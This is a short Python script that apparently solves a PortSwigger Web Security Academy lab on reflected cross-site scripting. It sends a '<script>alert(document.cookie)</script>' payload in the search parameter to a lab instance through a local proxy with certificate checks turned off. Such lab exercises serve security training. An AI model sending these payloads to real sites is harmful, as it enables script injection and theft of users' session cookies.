# https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

import requests
requests.packages.urllib3.disable_warnings()

url = "https://ac891faa1f8e563d8065195f005700ee.web-security-academy.net"
proxy = "127.0.0.1:8080"
proxies = {"https://": proxy, "http://": proxy}
verify = False
cookies = {"session": "2XDaH4jLSbcXzEDRXKB9GIFVJE9A6yNt"}

payload = "<script>alert(document.cookie)</script>"
params = {"search": payload}

requests.get(url, params=params, verify=verify, proxies=proxies)
